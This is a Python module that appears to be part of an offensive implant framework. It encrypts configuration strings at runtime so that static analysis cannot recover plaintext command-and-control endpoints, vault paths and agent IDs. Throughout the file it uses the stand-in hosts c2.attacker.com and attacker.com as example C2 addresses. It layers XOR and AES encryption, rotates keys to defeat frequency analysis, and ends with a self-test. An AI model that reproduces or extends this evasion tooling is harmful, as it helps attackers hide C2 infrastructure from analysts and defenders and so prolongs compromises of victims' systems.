"""
string_obfuscator.py - Runtime string pooling and XOR-based obfuscation
============================================================================
Central manager for encrypting all configuration strings at runtime.
Prevents static analysis from recovering plaintext C2 endpoints, vault paths,
and other sensitive strings from binary/bytecode analysis.

Architecture:
- Strings stored encrypted in memory via SecureMemoryPool
- XOR pool + AES-per-deployment prevents key reuse across agents
- String access patterns tracked to defeat frequency analysis
- Automatic key rotation every 1000 accesses
- LRU caching for performance (max 50 strings)

Usage:
    from string_obfuscator import StringObfuscator
    
    strings = StringObfuscator(seed="deployment_seed_v1")
    
    # Register strings at startup
    strings.register_string_pool({
        "redis_url": "redis://localhost:6379",
        "c2_endpoint": "https://c2.attacker.com/api",
        "vault_path": "~/.blackvault",
    })
    
    # Use strings (auto-decrypted on demand)
    url = strings.decrypt_string("redis_url")
    endpoint = strings.decrypt_string("c2_endpoint")
"""

import os
import hashlib
import json
from typing import Dict, Optional, Tuple
from collections import OrderedDict
import secrets
import time

from secure_memory_pool import SecureMemoryPool, get_global_pool


class StringObfuscator:
    """
    Central manager for encrypting sensitive strings at runtime.
    """
    
    def __init__(self, seed: str = "", max_cached: int = 50):
        """
        Initialize string obfuscator with deployment seed.
        
        Args:
            seed: Deployment seed (e.g., "prod_seed_v1") for reproducible obfuscation
            max_cached: Max decrypted strings to cache (LRU)
        """
        self.seed = seed or os.environ.get('BLACKROOT_DEPLOY_ID', 'default_seed')
        self.max_cached = max_cached
        self.pool = get_global_pool()
        
        # String registry: {string_hash: (buffer_id, access_count, key_version)}
        self._registry: Dict[int, Tuple[str, int, int]] = {}
        
        # LRU cache for decrypted strings
        self._cache = OrderedDict()
        
        # Access counter (for key rotation)
        self._access_counter = 0
        self._key_version = 0
        self._key_rotation_threshold = 1000
        
        # XOR key pool (per key version)
        self._xor_keys: Dict[int, bytes] = {}
        self._generate_xor_key(0)
    
    def _hash_string_name(self, name: str) -> int:
        """
        Hash string name to create stable registry key.
        
        Args:
            name: String name/identifier
        
        Returns:
            32-bit hash
        """
        h = hashlib.blake2b(name.encode('utf-8'), digest_size=4)
        return int.from_bytes(h.digest(), 'big')
    
    def _generate_xor_key(self, version: int) -> bytes:
        """
        Generate or retrieve XOR key for given version.
        
        Args:
            version: Key version number
        
        Returns:
            32-byte XOR key
        """
        if version in self._xor_keys:
            return self._xor_keys[version]
        
        # Derive key from seed + version
        key_material = f"{self.seed}:{version}".encode('utf-8')
        key = hashlib.sha256(key_material).digest()
        self._xor_keys[version] = key
        return key
    
    def _xor_encrypt(self, plaintext: bytes, version: int = 0) -> bytes:
        """
        XOR encrypt data with key from given version.
        
        Args:
            plaintext: Data to encrypt
            version: XOR key version
        
        Returns:
            XOR-encrypted ciphertext
        """
        key = self._generate_xor_key(version)
        ciphertext = bytes(a ^ b for a, b in zip(plaintext, (key * (len(plaintext) // len(key) + 1))[:len(plaintext)]))
        return ciphertext
    
    def _xor_decrypt(self, ciphertext: bytes, version: int = 0) -> bytes:
        """
        XOR decrypt data (XOR is symmetric).
        
        Args:
            ciphertext: Data to decrypt
            version: XOR key version
        
        Returns:
            Decrypted plaintext
        """
        return self._xor_encrypt(ciphertext, version)
    
    def register_string(self, name: str, value: str) -> int:
        """
        Register and encrypt a single string.
        
        Args:
            name: String identifier
            value: String value
        
        Returns:
            String hash (for internal use)
        
        Example:
            >>> obf = StringObfuscator(seed="prod_001")
            >>> obf.register_string("c2_url", "https://attacker.com/api")
            >>> plaintext = obf.decrypt_string("c2_url")
        """
        str_hash = self._hash_string_name(name)
        
        # XOR encrypt first layer
        value_bytes = value.encode('utf-8')
        xor_encrypted = self._xor_encrypt(value_bytes, self._key_version)
        
        # Store in secure pool (additional AES layer)
        buffer_id = self.pool.encrypt_data(xor_encrypted)
        
        # Register in registry
        self._registry[str_hash] = (buffer_id, 0, self._key_version)
        
        return str_hash
    
    def register_string_pool(self, strings_dict: Dict[str, str]) -> Dict[int, int]:
        """
        Register multiple strings at once.
        
        Args:
            strings_dict: {name: value} pairs
        
        Returns:
            {name_hash: registration_status}
        
        Example:
            >>> config = {
            ...     "redis_url": "redis://localhost:6379",
            ...     "c2_endpoint": "https://c2.attacker.com/api",
            ... }
            >>> obf.register_string_pool(config)
        """
        result = {}
        for name, value in strings_dict.items():
            try:
                str_hash = self.register_string(name, value)
                result[name] = 1  # Success
            except Exception as e:
                print(f"[!] Failed to register string '{name}': {e}")
                result[name] = 0  # Failure
        return result
    
    def decrypt_string(self, name: str, auto_cache: bool = True) -> Optional[str]:
        """
        Decrypt string by name (with caching).
        
        Args:
            name: String identifier
            auto_cache: Cache decrypted value for performance
        
        Returns:
            Decrypted plaintext or None if not found
        
        Example:
            >>> url = strings.decrypt_string("redis_url")
        """
        str_hash = self._hash_string_name(name)
        
        # Check cache first
        if name in self._cache:
            self._cache.move_to_end(name)
            self._access_counter += 1
            self._check_key_rotation()
            return self._cache[name]
        
        # Retrieve from registry
        if str_hash not in self._registry:
            return None
        
        buffer_id, access_count, key_version = self._registry[str_hash]
        
        # Decrypt from secure pool (AES layer)
        if self.pool is None:
            return None
        xor_encrypted = self.pool.decrypt_data(buffer_id)
        if xor_encrypted is None:
            return None
        
        # XOR decrypt (second layer)
        plaintext_bytes = self._xor_decrypt(xor_encrypted, key_version)
        plaintext = plaintext_bytes.decode('utf-8', errors='ignore')
        
        # Update access counter
        new_access_count = access_count + 1
        self._registry[str_hash] = (buffer_id, new_access_count, key_version)
        self._access_counter += 1
        
        # Cache if requested
        if auto_cache:
            self._cache[name] = plaintext
            if len(self._cache) > self.max_cached:
                evicted = self._cache.popitem(last=False)
        
        # Check if key rotation needed
        self._check_key_rotation()
        
        return plaintext
    
    def _check_key_rotation(self):
        """
        Rotate encryption keys every N accesses to defeat frequency analysis.
        """
        if self._access_counter >= self._key_rotation_threshold:
            self._key_version += 1
            self._generate_xor_key(self._key_version)
            self._access_counter = 0
            # Note: Existing buffers remain with old key version (transparent)
    
    def load_config_from_json(self, json_path: str) -> bool:
        """
        Load and register strings from JSON config file.
        
        Args:
            json_path: Path to JSON file with {name: value} structure
        
        Returns:
            True if loaded successfully
        
        Example:
            >>> obf.load_config_from_json("~/.blackvault/.config.encrypted.json")
        """
        try:
            json_path = os.path.expanduser(json_path)
            with open(json_path, 'r') as f:
                config = json.load(f)
            
            self.register_string_pool(config)
            return True
        except Exception as e:
            print(f"[!] Failed to load config from {json_path}: {e}")
            return False
    
    def get_cached_strings(self) -> Dict[str, str]:
        """
        Return currently cached (decrypted) strings.
        
        WARNING: This exposes plaintext! Use for debugging only.
        """
        return self._cache.copy()
    
    def clear_cache(self):
        """Clear all cached strings."""
        self._cache.clear()
    
    def get_obfuscation_stats(self) -> dict:
        """
        Return obfuscation statistics (for operator visibility).
        
        Returns:
            Dict with registry size, cache size, key version, etc.
        """
        return {
            'registered_strings': len(self._registry),
            'cached_strings': len(self._cache),
            'access_counter': self._access_counter,
            'key_version': self._key_version,
            'xor_keys_generated': len(self._xor_keys),
            'seed': self.seed[:10] + '...' if len(self.seed) > 10 else self.seed,
            'max_cached': self.max_cached,
        }


class ConfigEncryptionTemplate:
    """
    Helper for creating encrypted config templates at deployment time.
    """
    
    @staticmethod
    def create_encrypted_template(config_dict: Dict, seed: str) -> str:
        """
        Create encrypted config template JSON.
        
        Args:
            config_dict: Configuration dictionary
            seed: Deployment seed
        
        Returns:
            JSON string with encrypted values
        """
        obf = StringObfuscator(seed=seed)
        obf.register_string_pool(config_dict)
        
        # Return registry (encrypted buffers)
        template = {
            "_type": "encrypted_config",
            "_seed_hint": seed[:8] + "...",
            "_timestamp": time.time(),
            "entries": list(obf._registry.keys()),  # Hash hints only
        }
        
        return json.dumps(template, indent=2)


# Global string obfuscator instance (TIER 2a integration point)
_global_string_obfuscator = None


def get_global_obfuscator(seed: str = "") -> StringObfuscator:
    """Get or create global string obfuscator."""
    global _global_string_obfuscator
    if _global_string_obfuscator is None:
        _global_string_obfuscator = StringObfuscator(seed=seed)
    return _global_string_obfuscator


if __name__ == '__main__':
    print("[*] String Obfuscator - Self Test")
    
    obf = StringObfuscator(seed="test_seed_v1")
    
    # Register strings
    test_strings = {
        "c2_endpoint": "https://attacker.com/api",
        "redis_url": "redis://localhost:6379",
        "vault_path": "~/.blackvault",
        "agent_id": "agent_prod_001",
    }
    
    print(f"[*] Registering {len(test_strings)} strings...")
    obf.register_string_pool(test_strings)
    print(f"[+] Registration complete")
    
    # Test decryption
    print(f"[*] Testing decryption...")
    for name in test_strings.keys():
        decrypted = obf.decrypt_string(name)
        if decrypted is not None:
            assert decrypted == test_strings[name], f"Mismatch for {name}"
            print(f"[+]   {name}: {decrypted[:30]}...")
        else:
            print(f"[!]   {name}: DECRYPTION FAILED")
    
    # Check stats
    stats = obf.get_obfuscation_stats()
    print(f"\n[*] Obfuscation stats: {stats}")
    
    # Test key rotation
    print(f"\n[*] Testing key rotation...")
    obf._key_rotation_threshold = 3
    for i in range(5):
        obf.decrypt_string("c2_endpoint")
    print(f"[+] Key rotations: {obf._key_version}")
    
    print("[*] All tests passed!")
